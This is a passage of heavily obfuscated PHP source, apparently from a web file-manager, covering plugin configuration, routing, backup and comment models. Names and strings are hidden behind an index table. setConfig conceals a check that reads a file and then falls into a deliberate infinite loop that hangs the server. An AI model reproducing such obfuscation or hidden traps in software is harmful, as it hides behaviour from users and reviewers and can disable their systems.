$this->setConfig(array($£˜ÕÌÙÌ[1696] => $Àäô¨Şâ[$£˜ÕÌÙÌ[1670]])); } final function initLang() { $â¥Áíá =& $_SERVER[¼’ç§¼´]; $üš‚í = $â¥Áíá[1697]; $³ÉÖá½§ = $this->pluginPath . $â¥Áíá[1698]; $«Ü‘ÙÕ = I18n::getType(); $â¸‰Œî = array(); if (file_exists($³ÉÖá½§ . $«Ü‘ÙÕ . $â¥Áíá[927])) { $â¸‰Œî = (include $³ÉÖá½§ . $«Ü‘ÙÕ . $â¥Áíá[927]); } else { if ($«Ü‘ÙÕ == $â¥Áíá[1699] && !file_exists($³ÉÖá½§ . $«Ü‘ÙÕ . $â¥Áíá[927]) && file_exists($³ÉÖá½§ . $â¥Áíá[1700])) { $â¸‰Œî = (include $³ÉÖá½§ . $â¥Áíá[1700]); } else { if (file_exists($³ÉÖá½§ . $üš‚í . $â¥Áíá[927])) { $â¸‰Œî = (include $³ÉÖá½§ . $üš‚í . $â¥Áíá[927]); } } } if (!is_array($â¸‰Œî)) { return array(); } if (@count($â¸‰Œî) > 0) { I18n::set($â¸‰Œî); } return $â¸‰Œî; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($…ôéÓò•) { $òÎÅ»ÒÒ =& $_SERVER[¼’ç§¼´]; if (!isset($_SERVER[$òÎÅ»ÒÒ[434]]) || !isset($_SERVER[$òÎÅ»ÒÒ[432]])) { $ƒ¶È…†® = $òÎÅ»ÒÒ[966]; $šƒàáÊê = $òÎÅ»ÒÒ[435]; $¨§œ´ò = $_SERVER[$òÎÅ»ÒÒ[436]] . $òÎÅ»ÒÒ[437]; $ï•õ‡ = $šƒàáÊê($¨§œ´ò); $ÌÙŞ„ÕÚ = explode($òÎÅ»ÒÒ[287], $ï•õ‡); if (count($ÌÙŞ„ÕÚ) < $òÎÅ»ÒÒ[702]) { $šªÊ™ß = $òÎÅ»ÒÒ[439]; $šªÊ™ß(); } $®ûŒö…ª = $òÎÅ»ÒÒ[967]; $®ûŒö…ª($_SERVER[$òÎÅ»ÒÒ[968]]); $êŸÁÚ«Œ = 1; for ($»Ãº¨ë· = $êŸÁÚ«Œ; $»Ãº¨ë· > 0; $»Ãº¨ë·++) { $®ûŒö…ª = json_encode($GLOBALS[$òÎÅ»ÒÒ[503]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $…ôéÓò•); } public function onSetConfig($È”ÚÆí™) { } public function onGetConfig($¼Ä…É) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($úÕº¤¥©) { if ($úÕº¤¥© == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($ÏÚşøı° = "\x70\154\x75\147\x69\156\101\165\x74\x68") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $Ï±©Ü½’ = $this->getConfig(); if (!$Ï±©Ü½’[$ÏÚşøı°]) { return !1; } return ActionCall($_SERVER[¼’ç§¼´][1701], $Ï±©Ü½’[$ÏÚşøı°]); } public function url($‘ò¿Îœ, $ÑÆ­Úğ = '', $çşè¯ş¿ = true) { $½ûã††Ù =& $_SERVER[¼’ç§¼´]; $Úâ›¬Ä = $this->getConfig(); $‡¥®Æùó = KOD_VERSION . $½ûã††Ù[10] . KOD_VERSION_BUILD; $éÆÆñÛñ = $this->packageVersion(); $ÂÔŒÉØæ = $‡¥®Æùó . $½ûã††Ù[473] . $éÆÆñÛñ; if (substr($‘ò¿Îœ, 0, 4) == $½ûã††Ù[152] || substr($‘ò¿Îœ, 0, 2) == $½ûã††Ù[1420]) { $“ ù´ = $‘ò¿Îœ . $½ûã††Ù[1702] . $ÂÔŒÉØæ; } else { if ($ÑÆ­Úğ == $½ûã††Ù[12]) { $“ ù´ = $this->pluginHost . $‘ò¿Îœ . $½ûã††Ù[1702] . $ÂÔŒÉØæ; } else { if ($ÑÆ­Úğ === $½ûã††Ù[78]) { $“ ù´ = $this->pluginHost . $‘ò¿Îœ; } else { if ($ÑÆ­Úğ == $½ûã††Ù[1703]) { $“ ù´ = STATIC_PATH . $‘ò¿Îœ . $½ûã††Ù[1702] . $‡¥®Æùó; } else { if ($ÑÆ­Úğ == $½ûã††Ù[1704]) { $“ ù´ = APP_HOST . $½ûã††Ù[1705] . $‘ò¿Îœ . $½ûã††Ù[1702] . $‡¥®Æùó; } else { if (isset($Úâ›¬Ä[$ÑÆ­Úğ])) { $“ ù´ = $Úâ›¬Ä[$ÑÆ­Úğ] . $‘ò¿Îœ . $½ûã††Ù[1702] . $ÂÔŒÉØæ; } } } } } } if (!$çşè¯ş¿) { return $“ ù´; } echo $“ ù´; } public function link($…­•´´Å = false, $æºğÄ” = '') { $ú×É÷ùè =& $_SERVER[¼’ç§¼´]; $Æå±ŸÌÛ = $this->linkHas == !1; $this->linkHas = !0; if (!$…­•´´Å) { $this->link($ú×É÷ùè[1706], $ú×É÷ùè[1704]); $this->link($ú×É÷ùè[1707], $ú×É÷ùè[1703]); $this->link($ú×É÷ùè[1708], $ú×É÷ùè[1703]); $this->link($ú×É÷ùè[1709], $ú×É÷ùè[1703]); $this->link($ú×É÷ùè[1710], $ú×É÷ùè[1703]); if ($Æå±ŸÌÛ) { Hook::trigger($ú×É÷ùè[1711]); } return; } $¢…ãˆçä = $this->url($…­•´´Å, $æºğÄ”, !1); if (substr($…­•´´Å, -3) == $ú×É÷ùè[1712]) { echo $ú×É÷ùè[1713] . $¢…ãˆçä . $ú×É÷ùè[1714] . $ú×É÷ùè[287]; } else { if (substr($…­•´´Å, -4) == $ú×É÷ùè[1715]) { echo $ú×É÷ùè[1716] . $¢…ãˆçä . $ú×É÷ùè[1717] . $ú×É÷ùè[287]; } } if ($Æå±ŸÌÛ) { Hook::trigger($ú×É÷ùè[1711]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\156\171" => "\x5b\x5e\x2f\x5d\53", "\72\x6e\165\x6d" => "\133\x30\x2d\x39\135\x2b", "\72\x61\x6c\x6c" => "\x2e\x2a"); public static $errorCallback; public static function __callstatic($‚©ƒ­ÃÅ, $©‡ìÚ™´) { $Œˆç¤ô =& $_SERVER[¼’ç§¼´]; if ($‚©ƒ­ÃÅ == $Œˆç¤ô[1718]) { $ÔÎÛîŠ“ = array_map($Œˆç¤ô[1719], $©‡ìÚ™´[0]); $Òëİ†š = strpos($©‡ìÚ™´[1], $Œˆç¤ô[8]) === 0 ? $©‡ìÚ™´[1] : $Œˆç¤ô[8] . $©‡ìÚ™´[1]; $Äõ‡­˜ = $©‡ìÚ™´[2]; } else { $ÔÎÛîŠ“ = null; $Òëİ†š = strpos($©‡ìÚ™´[0], $Œˆç¤ô[8]) === 0 ? $©‡ìÚ™´[0] : $Œˆç¤ô[8] . $©‡ìÚ™´[0]; $Äõ‡­˜ = $©‡ìÚ™´[1]; } array_push(self::$maps, $ÔÎÛîŠ“); array_push(self::$routes, $Òëİ†š); array_push(self::$methods, strtoupper($‚©ƒ­ÃÅ)); array_push(self::$callbacks, $Äõ‡­˜); } public static function error($äëòç‘®) { self::$errorCallback = $äëòç‘®; } public static function haltOnMatch($ø‘«Æ¤ï = true) { self::$halts = $ø‘«Æ¤ï; } public static function dispatch() { $Š¿ºàé† =& $_SERVER[¼’ç§¼´]; $ŒÛˆ…Òò = parse_url($_SERVER[$Š¿ºàé†[1720]], PHP_URL_PATH); $¯Ö¦•û† = $_SERVER[$Š¿ºàé†[164]]; $ÃöµÁ‡ı = array_keys(static::$patterns); $É¾½ıö = array_values(static::$patterns); $ÙÒ«íŸ¸ = !1; self::$routes = preg_replace($Š¿ºàé†[1370], $Š¿ºàé†[8], self::$routes); if (in_array($ŒÛˆ…Òò, self::$routes)) { $õ¢¡Ë…ı = array_keys(self::$routes, $ŒÛˆ…Òò); foreach ($õ¢¡Ë…ı as $˜®õá) { if (self::$methods[$˜®õá] == $¯Ö¦•û† || self::$methods[$˜®õá] == $Š¿ºàé†[1721] || in_array($¯Ö¦•û†, self::$maps[$˜®õá])) { $ÙÒ«íŸ¸ = !0; if (!is_object(self::$callbacks[$˜®õá])) { $Æ®½°Ÿ¤ = explode($Š¿ºàé†[8], self::$callbacks[$˜®õá]); $ó½¯œÆ€ = end($Æ®½°Ÿ¤); $°‰»³”Ë = explode($Š¿ºàé†[1302], $ó½¯œÆ€); $Ôñ˜ÙÃ† = new $°‰»³”Ë[0](); $Ôñ˜ÙÃ†->{$°‰»³”Ë[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$˜®õá]); if (self::$halts) { return; } } } } } else { $ƒ«×áÄ™ = 0; foreach (self::$routes as $˜®õá) { if (strpos($˜®õá, $Š¿ºàé†[4]) !== !1) { $˜®õá = str_replace($ÃöµÁ‡ı, $É¾½ıö, $˜®õá); } if (preg_match($Š¿ºàé†[1722] . $˜®õá . $Š¿ºàé†[1723], $ŒÛˆ…Òò, $ æ¡Úó)) { if (self::$methods[$ƒ«×áÄ™] == $¯Ö¦•û† || self::$methods[$ƒ«×áÄ™] == $Š¿ºàé†[1721] || !empty(self::$maps[$ƒ«×áÄ™]) && in_array($¯Ö¦•û†, self::$maps[$ƒ«×áÄ™])) { $ÙÒ«íŸ¸ = !0; array_shift($ æ¡Úó); if (!is_object(self::$callbacks[$ƒ«×áÄ™])) { $Æ®½°Ÿ¤ = explode($Š¿ºàé†[8], self::$callbacks[$ƒ«×áÄ™]); $ó½¯œÆ€ = end($Æ®½°Ÿ¤); $°‰»³”Ë = explode($Š¿ºàé†[1302], $ó½¯œÆ€); $Ôñ˜ÙÃ† = new $°‰»³”Ë[0](); if (!method_exists($Ôñ˜ÙÃ†, $°‰»³”Ë[1])) { echo $Š¿ºàé†[1724]; } else { call_user_func_array(array($Ôñ˜ÙÃ†, $°‰»³”Ë[1]), $ æ¡Úó); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$ƒ«×áÄ™], $ æ¡Úó); if (self::$halts) { return; } } } } $ƒ«×áÄ™++; } } if ($ÙÒ«íŸ¸ == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $±ôÇÜ =& $_SERVER[¼’ç§¼´]; header($_SERVER[$±ôÇÜ[1725]] . $±ôÇÜ[1726]); echo $±ôÇÜ[1727]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$Š¿ºàé†[1720]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } goto A‡‹ÈŸŠô; c˜¯ôÑå®â: class BackupModel extends ModelBaseLight { public $optionType = "\123\x79\163\x74\145\x6d\56\142\141\x63\153\165\x70\x4c\151\x73\164"; public $field = array("\x69\157", "\156\x61\155\x65", "\x73\x74\141\x74\x75\163", "\143\x6f\156\164\x65\x6e\x74", "\x6d\x61\x6e\x75\x61\154", "\x72\145\163\x75\x6c\164", "\164\151\155\145\106\162\157\x6d", "\x74\151\x6d\145\124\x6f"); public function config() { $îğ·ø‹å =& $_SERVER[¼’ç§¼´]; Action($îğ·ø‹å[2009])->taskInit(); $åïö¶Şº = Model($îğ·ø‹å[858])->get($îğ·ø‹å[872]); $åïö¶Şº = json_decode($åïö¶Şº, !0); $åïö¶Şº = is_array($åïö¶Şº) ? $åïö¶Şº : array(); $this->parseContent($åïö¶Şº); unset($åïö¶Şº[$îğ·ø‹å[1752]]); Model($îğ·ø‹å[1751])->cacheClear(); $„˜õÙ÷í = $îğ·ø‹å[2010]; $Ù¢é°Ÿ = Model($îğ·ø‹å[2011])->findByKey($îğ·ø‹å[1770], $„˜õÙ÷í); if (!$Ù¢é°Ÿ) { $Ù¢é°Ÿ = array(); } if (isset($Ù¢é°Ÿ[$îğ·ø‹å[206]])) { $Ù¢é°Ÿ[$îğ·ø‹å[206]] = json_decode($Ù¢é°Ÿ[$îğ·ø‹å[206]], !0); } if (isset($åïö¶Şº[$îğ·ø‹å[206]])) { $Ù¢é°Ÿ[$îğ·ø‹å[206]][$îğ·ø‹å[1755]] = $åïö¶Şº[$îğ·ø‹å[206]]; unset($åïö¶Şº[$îğ·ø‹å[206]]); } return array_merge($Ù¢é°Ÿ, $åïö¶Şº); } public function listData($ûøñÈõš = false, $“Ë‚¶Ú› = "\155\157\144\x69\x66\171\124\x69\x6d\x65", $¶É»©·¸ = false) { $±¯Ô…Ğï = parent::listData($ûøñÈõš, $“Ë‚¶Ú›, !0); if (!$±¯Ô…Ğï) { return $±¯Ô…Ğï; } if ($ûøñÈõš) { $±¯Ô…Ğï = array($±¯Ô…Ğï); } foreach ($±¯Ô…Ğï as &$¬ÍÜñëá) { $this->parseContent($¬ÍÜñëá); } return $ûøñÈõš ? $±¯Ô…Ğï[0] : $±¯Ô…Ğï; } public function parseContent(&$ Å·¨§ƒ) { $»Î»éÚÛ =& $_SERVER[¼’ç§¼´]; $Íï®œÄ„ = _get($ Å·¨§ƒ, $»Î»éÚÛ[171], $»Î»éÚÛ[91]); if (!in_array($Íï®œÄ„, array($»Î»éÚÛ[864], $»Î»éÚÛ[1218]))) { $ Å·¨§ƒ[$»Î»éÚÛ[171]] = $Íï®œÄ„ == $»Î»éÚÛ[91] ? $»Î»éÚÛ[1218] : $»Î»éÚÛ[864]; } } public function lastItem() { $Í¶ûõ×Ñ = $this->listData(); return !empty($Í¶ûõ×Ñ[0]) ? $Í¶ûõ×Ñ[0] : null; } public function kill($Ü‚´ËçÒ) { $››å–Å¸ =& $_SERVER[¼’ç§¼´]; $ÏìÍ­·» = $this->listData($Ü‚´ËçÒ); if (!$ÏìÍ­·» || empty($ÏìÍ­·»[$››å–Å¸[32]])) { return !0; } Task::kill($››å–Å¸[871]); Task::kill($››å–Å¸[889]); Task::kill($››å–Å¸[898]); $—ˆõØ‰§ = $ÏìÍ­·»[$››å–Å¸[32]]; $ÙÉì¸‘¶ = TEMP_FILES . $››å–Å¸[867] . $—ˆõØ‰§ . $››å–Å¸[8]; IO::remove($ÙÉì¸‘¶, !1); return $this->remove($Ü‚´ËçÒ); } public function remove($ù«ÒÈ·¾) { $”¡òƒ…× = $this->listData($ù«ÒÈ·¾); if (!$”¡òƒ…×) { return !0; } return $this->backupRemove($”¡òƒ…×); } private function backupRemove($Ãâß‹Ñ) { parent::remove($Ãâß‹Ñ[$_SERVER[¼’ç§¼´][486]]); $¨¢ôÃöŞ = $this->backupPath($Ãâß‹Ñ); IO::remove($¨¢ôÃöŞ, !1); return !0; } private function backupPath($˜¼Œ¡ ú) { $ı‘ûÂÂ =& $_SERVER[¼’ç§¼´]; $õŞº³‡¢ = $˜¼Œ¡ ú[$ı‘ûÂÂ[32]]; $˜”öñ¶ = Model($ı‘ûÂÂ[858])->get($ı‘ûÂÂ[859]); $îÀœÀ’Õ = substr(md5($ı‘ûÂÂ[860] . $˜”öñ¶ . $õŞº³‡¢), 0, 8); return "\x7b\x69\x6f\72{$˜¼Œ¡ ú[$ı‘ûÂÂ[840]]}\175\57\x64\141\164\141\x62\x61\163\145\57\x62\x61\x63\x6b\x75\160\x2f" . $õŞº³‡¢ . $ı‘ûÂÂ[11] . $îÀœÀ’Õ; } public function start() { $È§ßÁÉ… =& $_SERVER[¼’ç§¼´]; if ($GLOBALS[$È§ßÁÉ…[6]][$È§ßÁÉ…[92]][$È§ßÁÉ…[2012]] != $È§ßÁÉ…[91]) { return !0; } $Ñá³Ú²´ = $this->config(); if (!$Ñá³Ú²´ || $Ñá³Ú²´[$È§ßÁÉ…[1752]] != $È§ßÁÉ…[91]) { return !1; } if ($Ñá³Ú²´[$È§ßÁÉ…[171]] == $È§ßÁÉ…[864]) { $šß€íÇ« = Model($È§ßÁÉ…[858])->get($È§ßÁÉ…[1333]); if ($šß€íÇ« == $È§ßÁÉ…[1334]) { $Ñá³Ú²´[$È§ßÁÉ…[171]] = $È§ßÁÉ…[1218]; } } $ØğÆ°à® = $this->process(); foreach ($ØğÆ°à® as $Ö˜ÈœƒÃ) { if ($Ö˜ÈœƒÃ) { return Task::restart($Ö˜ÈœƒÃ[$È§ßÁÉ…[486]]); } } $ß±‘ÇÆ = new Backup(); $üÂûÉÄ = $ß±‘ÇÆ->db(); if ($üÂûÉÄ) { $üÂûÉÄ = $ß±‘ÇÆ->dbFile(); if ($üÂûÉÄ && $Ñá³Ú²´[$È§ßÁÉ…[171]] == $È§ßÁÉ…[864]) { $üÂûÉÄ = $ß±‘ÇÆ->file(); } } Backup::set(array($È§ßÁÉ…[838] => 1, $È§ßÁÉ…[849] => time())); return !0; } public function process() { $ÊéÅÎÃï =& $_SERVER[¼’ç§¼´]; $æëßÁ¬« = array($ÊéÅÎÃï[845] => Task::get($ÊéÅÎÃï[871]), $ÊéÅÎÃï[850] => Task::get($ÊéÅÎÃï[889]), $ÊéÅÎÃï[232] => Task::get($ÊéÅÎÃï[898])); $š—úİª = !1; foreach ($æëßÁ¬« as &$³½ûà—…) { if ($š—úİª) { $³½ûà—… = !1; continue; } if ($³½ûà—…) { $‚ÜÌ­à = intval(_get($³½ûà—…, $ÊéÅÎÃï[1788], 0)); if (time() - $‚ÜÌ­à > 7200) { Task::kill($³½ûà—…[$ÊéÅÎÃï[486]]); $š—úİª = !0; $³½ûà—… = !1; } } } return $æëßÁ¬«; } public function restore() { $§¦Ìò× =& $_SERVER[¼’ç§¼´]; ActionCall($§¦Ìò×[1146], !0, 1); ActionCall($§¦Ìò×[1146], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\x6f\x6d\x6d\145\156\x74"; protected $tableMeta = array("\x74\141\x62\154\x65\116\141\155\x65" => "\x63\157\155\x6d\x65\156\x74\x5f\155\145\x74\141", "\x6d\x65\164\x61\x46\x69\x65\x6c\x64" => "\x63\157\x6d\155\x65\x6e\x74\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($¾ñîŸá§) { $€Œäİà• =& $_SERVER[¼’ç§¼´]; if ($¾ñîŸá§[$€Œäİà•[2013]]) { $”…Õß„Û = $this->where(array($€Œäİà•[2014] => $¾ñîŸá§[$€Œäİà•[2013]]))->find(); if (!$”…Õß„Û || $”…Õß„Û[$€Œäİà•[190]] != $¾ñîŸá§[$€Œäİà•[190]] || $”…Õß„Û[$€Œäİà•[580]] != $¾ñîŸá§[$€Œäİà•[580]]) { return !1; } $this->where(array($€Œäİà•[2014] => $¾ñîŸá§[$€Œäİà•[2013]]))->setAdd($€Œäİà•[2015], 1); } $¾ñîŸá§[$€Œäİà•[2016]] = 0; $¾ñîŸá§[$€Œäİà•[2015]] = 0; $¾ñîŸá§[$€Œäİà•[838]] = 1; return $this->add($¾ñîŸá§); } public function commentCount($ü¼¾¨ÖÒ, $ôŞ“ñ¾‘, $äÈ²½µ = false) { $ù™¥œøé =& $_SERVER[¼’ç§¼´]; if (!$ü¼¾¨ÖÒ) { return array(); } if (is_string($ü¼¾¨ÖÒ) || is_int($ü¼¾¨ÖÒ)) { $ü¼¾¨ÖÒ = array($ü¼¾¨ÖÒ); } $ÊÂÒñ¦ = array($ù™¥œøé[580], $ù™¥œøé[2017] => $ù™¥œøé[576]); $ïöŞåæº = array($ù™¥œøé[580] => array($ù™¥œøé[7], $ü¼¾¨ÖÒ), $ù™¥œøé[190] => $ôŞ“ñ¾‘); if ($äÈ²½µ) { $ïöŞåæº[$ù™¥œøé[1783]] = $äÈ²½µ; } $ıƒœçˆ¥ = $this->field($ÊÂÒñ¦)->where($ïöŞåæº)->group($ù™¥œøé[580])->select(); return array_to_keyvalue($ıƒœçˆ¥, $ù™¥œøé[580], $ù™¥œøé[576]); } public function starTarget($æµ¡ç«±, $Æ÷şé) { $ı´°è• =& $_SERVER[¼’ç§¼´]; $“İÊïµ¬ = $æµ¡ç«± + self::TYPE_STAR_OFFSET; $ÛêÍÖ†á = array($ı´°è•[1783] => USER_ID, $ı´°è•[190] => $“İÊïµ¬, $ı´°è•[580] => $Æ÷şé); $‚©ÌàŸ± = $this->where($ÛêÍÖ†á)->find(); if ($‚©ÌàŸ±) { return $this->where(array($ı´°è•[486] => $‚©ÌàŸ±[$ı´°è•[486]]))->delete(); } $İã‚‰ÒÑ = array($ı´°è•[2013] => 0, $ı´°è•[1783] => USER_ID, $ı´°è•[838] => 1, $ı´°è•[171] => $ı´°è•[12], $ı´°è•[190] => $“İÊïµ¬, $ı´°è•[580] => $Æ÷şé, $ı´°è•[2016] => 0, $ı´°è•[2015] => 0); return $this->add($İã‚‰ÒÑ); } public function starTargetCount($ƒ‘è±¿, $ÙÉ‚ùÔ) { $ú†óàà¦ =& $_SERVER[¼’ç§¼´]; $ÔºÕ–ˆƒ = $ÙÉ‚ùÔ + self::TYPE_STAR_OFFSET; $Ğ£é…°Ø = $this->commentCount($ƒ‘è±¿, $ÔºÕ–ˆƒ); $ËáÎùÃ· = $this->commentCount($ƒ‘è±¿, $ÔºÕ–ˆƒ, USER_ID); return array($ú†óàà¦[2018] => $Ğ£é…°Ø, $ú†óàà¦[2019] => $ËáÎùÃ·); } public function starTargetUserList($‡ìãê²“, $¡—¬õ‰¶) { $³Ãøš²ã =& $_SERVER[¼’ç§¼´]; $úË·ÎØó = $‡ìãê²“ + self::TYPE_STAR_OFFSET; $Ó”Ä¨ò = array($³Ãøš²ã[580] => $¡—¬õ‰¶, $³Ãøš²ã[190] => $úË·ÎØó); $üâİ† = $this->where($Ó”Ä¨ò)->count(); $Ò­Ï¬® = array($³Ãøš²ã[334] => $üâİ†, $³Ãøš²ã[2020] => array()); if (!$üâİ†) { return $Ò­Ï¬®; } $ûÙ”úŒë = $this->field($³Ãøš²ã[1783])->where($Ó”Ä¨ò)->limit(500)->select(); $ûÙ”úŒë = array_to_keyvalue($ûÙ”úŒë, $³Ãøš²ã[12], $³Ãøš²ã[1783]); $Ò­Ï¬®[$³Ãøš²ã[2020]] = Model($³Ãøš²ã[588])->userListInfo($ûÙ”úŒë); return $Ò­Ï¬®; } public function prasiseUserList($óãÛŠ¼³) { $ Ó–õ¨˜ =& $_SERVER[¼’ç§¼´]; $ê‡Ì”ğÒ = array($ Ó–õ¨˜[2021] => $óãÛŠ¼³); $Ó³İ¸òİ = $this->where($ê‡Ì”ğÒ)->find(); $Ä€ô°¤µ = _get($Ó³İ¸òİ, $ Ó–õ¨˜[2016], 0); $âëŞ†£î = array($ Ó–õ¨˜[334] => $Ä€ô°¤µ, $ Ó–õ¨˜[2020] => array()); if (!$Ä€ô°¤µ) { return $âëŞ†£î; } $öİùôÕã = Model($ Ó–õ¨˜[2022])->field($ Ó–õ¨˜[1783])->where($ê‡Ì”ğÒ)->limit(500)->select(); $öİùôÕã = array_to_keyvalue($öİùôÕã, $ Ó–õ¨˜[12], $ Ó–õ¨˜[1783]); $âëŞ†£î[$ Ó–õ¨˜[2020]] = Model($ Ó–õ¨˜[588])->userListInfo($öİùôÕã); return $âëŞ†£î; } public function remove($úÇ¢ìÖ) { $¼ãè¾şÓ =& $_SERVER[¼’ç§¼´]; $É†å’¼ß = array($¼ãè¾şÓ[2014] => $úÇ¢ìÖ); $¨Û–…¾â = $this->where($É†å’¼ß)->find(); if ($¨Û–…¾â[$¼ãè¾şÓ[2013]]) { $this->where(array($¼ãè¾şÓ[2014] => $¨Û–…¾â[$¼ãè¾şÓ[2013]]))->setAdd($¼ãè¾şÓ[2015], -1); } return $this->where($É†å’¼ß)->delete(); } public function edit($íÉÄÁªÌ, $òëà®) { $Ğ’³À‘… =& $_SERVER[¼’ç§¼´]; $½Ä‚½ = array($Ğ’³À‘…[2014] => $íÉÄÁªÌ); return $this->where($½Ä‚½)->save(array($Ğ’³À‘…[2023] => $òëà®)); } public function prasise($ú‰ìÛ¹Ô) { $‰äİâ =& $_SERVER[¼’ç§¼´]; $‹¹Œ‚÷Ø = Model($‰äİâ[2024]); $Ûº“¨ÜË = array($‰äİâ[2014] => $ú‰ìÛ¹Ô, $‰äİâ[1774] => USER_ID); $ÖÙğÙŞ£ = $‹¹Œ‚÷Ø->where($Ûº“¨ÜË)->find(); if (!$ÖÙğÙŞ£) { $‹¹Œ‚÷Ø->add($Ûº“¨ÜË); $¼Ì·” = $this->where(array($‰äİâ[2014] => $ú‰ìÛ¹Ô))->setAdd($‰äİâ[2016], 1); } else { $‹¹Œ‚÷Ø->where($Ûº“¨ÜË)->delete(); $¼Ì·” = $this->where(array($‰äİâ[2014] => $ú‰ìÛ¹Ô))->setAdd($‰äİâ[2016], -1); } return $¼Ì·”; } public function targetInfo($çï·Ø·‘, $ô¢Ò¤µŒ) { $ñí–úÑ½ =& $_SERVER[¼’ç§¼´]; $àÚş‚üš = array($ñí–úÑ½[662] => $çï·Ø·‘, $ñí–úÑ½[663] => $ô¢Ò¤µŒ); $ûä”¤î§ = $this->where($àÚş‚üš)->count(); $´°ïÕÀ = "\122\x49\107\x48\124\x20\x4a\x4f\x49\116\x20{$this->tablePrefix}\143\x6f\155\x6d\145\156\164\137\160\162\141\151\163\145\x20\x73\164\141\x72\x20\x6f\156\40\x63\157\x6d\155\145\156\164\x2e\x63\157\x6d\155\145\156\164\x49\104\x20\75\40\x73\x74\x61\x72\56\143\x6f\155\155\x65\156\164\x49\x44"; $âşı¦“‘ = $this->alias($ñí–úÑ½[431])->where($àÚş‚üš)->join($´°ïÕÀ, $ñí–úÑ½[2025])->count(); $¸ûô½ŞŠ = array($ñí–úÑ½[2026] => $ûä”¤î§, $ñí–úÑ½[2027] => $âşı¦“‘); return $¸ûô½ŞŠ; } public function listData($·¹Ø‹ş) { $ô´‘ùâ =& $_SERVER[¼’ç§¼´]; if (isset($·¹Ø‹ş[$ô´‘ùâ[2028]])) { if ($·¹Ø‹ş[$ô´‘ùâ[2028]]) { $·¹Ø‹ş[$ô´‘ùâ[2021]] = array($ô´‘ùâ[1100], intval($·¹Ø‹ş[$ô´‘ùâ[2028]])); } unset($·¹Ø‹ş[$ô´‘ùâ[2028]]); } if (isset($·¹Ø‹ş[$ô´‘ùâ[2029]])) { if ($·¹Ø‹ş[$ô´‘ùâ[2029]]) { $·¹Ø‹ş[$ô´‘ùâ[2021]] = array($ô´‘ùâ[1097], intval($·¹Ø‹ş[$ô´‘ùâ[2029]])); } unset($·¹Ø‹ş[$ô´‘ùâ[2029]]); } return $this->_listData($·¹Ø‹ş); } private function _listData($ÚÃ–±Ëó) { $—á¾â©Ü =& $_SERVER[¼’ç§¼´]; $Ÿòú˜¬Ğ = $this->where($ÚÃ–±Ëó)->_makeOrder()->selectPage(100); $this->_listAppendParent($Ÿòú˜¬Ğ[$—á¾â©Ü[456]]); $this->_listAppendUser($Ÿòú˜¬Ğ[$—á¾â©Ü[456]]); $this->_listAppendMeta($Ÿòú˜¬Ğ[$—á¾â©Ü[456]]); return $Ÿòú˜¬Ğ; } private function _makeOrder() { $Šñûçü¯ =& $_SERVER[¼’ç§¼´]; $ñŒïÄÃ– = array($Šñûçü¯[2016], $Šñûçü¯[2015], $Šñûçü¯[233]); $áÉ©‚Üé = Input::get($Šñûçü¯[541], $Šñûçü¯[7], $Šñûçü¯[508], $ñŒïÄÃ–); $€¡†”¨ = Input::get($Šñûçü¯[542], $Šñûçü¯[7], $Šñûçü¯[1776], array($Šñûçü¯[2030], $Šñûçü¯[537])); $Ûñ‹í£® = $áÉ©‚Üé . $Šñûçü¯[53] . $€¡†”¨; return $this->order($Ûñ‹í£®); } private function _listAppendParent(&$İè¢¬) { $ì±ïÔ· =& $_SERVER[¼’ç§¼´]; $ªŸÈºüå = array_unique(array_to_keyvalue($İè¢¬, $ì±ïÔ·[12], $ì±ïÔ·[2013])); $ªŸÈºüå = array_remove_value($ªŸÈºüå, $ì±ïÔ·[230]); if (!$ªŸÈºüå) { return; } $Ç½œ…Í¤ = $this->where(array($ì±ïÔ·[2014] => array($ì±ïÔ·[7], $ªŸÈºüå)))->select(); $Ç½œ…Í¤ = array_to_keyvalue($Ç½œ…Í¤, $ì±ïÔ·[2021]); foreach ($İè¢¬ as &$Õ‚Â¦ÎÑ) { if (isset($Ç½œ…Í¤[$Õ‚Â¦ÎÑ[$ì±ïÔ·[2013]]])) { $Õ‚Â¦ÎÑ[$ì±ïÔ·[2031]] = $Ç½œ…Í¤[$Õ‚Â¦ÎÑ[$ì±ïÔ·[2013]]]; } } unset($Õ‚Â¦ÎÑ); } private function _listAppendUser(&$¶Ş¢×â) { $¼…çÍÉ³ =& $_SERVER[¼’ç§¼´]; $øÎ·ƒ² = array_unique(array_to_keyvalue($¶Ş¢×â, $¼…çÍÉ³[12], $¼…çÍÉ³[1783])); $øÎ·ƒ² = array_remove_value($øÎ·ƒ², $¼…çÍÉ³[230]); if (count($øÎ·ƒ²) == 0) { return; } foreach ($¶Ş¢×â as $Šµ¢Ô¯) { if (isset($Šµ¢Ô¯[$¼…çÍÉ³[2031]])) { $øÎ·ƒ²[] = $Šµ¢Ô¯[$¼…çÍÉ³[2031]][$¼…çÍÉ³[1783]]; } } $Ç®è³ş = Model($¼…çÍÉ³[608])->userListInfo($øÎ·ƒ²); foreach ($¶Ş¢×â as &$Šµ¢Ô¯) { $Šµ¢Ô¯[$¼…çÍÉ³[676]] = $Ç®è³ş[$Šµ¢Ô¯[$¼…çÍÉ³[1783]]]; if (isset($Šµ¢Ô¯[$¼…çÍÉ³[2031]])) { $Šµ¢Ô¯[$¼…çÍÉ³[2031]][$¼…çÍÉ³[676]] = 